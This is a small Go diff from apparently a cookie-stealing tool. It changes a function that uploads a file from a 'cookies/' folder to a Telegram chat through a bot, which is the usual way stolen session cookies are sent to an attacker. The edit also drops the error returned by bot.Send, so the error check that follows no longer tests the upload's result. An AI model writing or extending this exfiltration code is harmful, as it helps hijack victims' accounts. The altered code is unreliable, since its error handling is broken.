@@ -299,7 +299,7 @@ func send(text string, botT string, chat_id int64, tGcookie string) {
 	}
 	//Send the cookie attachment
 	docMsg :=  tgbotapi.NewDocumentUpload(chat_id, "cookies/"+tGcookie+".txt")
-	_, err := bot.Send(docMsg)
+	bot.Send(docMsg)
 
 	if err != nil {
 		fmt.Printf("Error sending cookie attachment: %v", err)
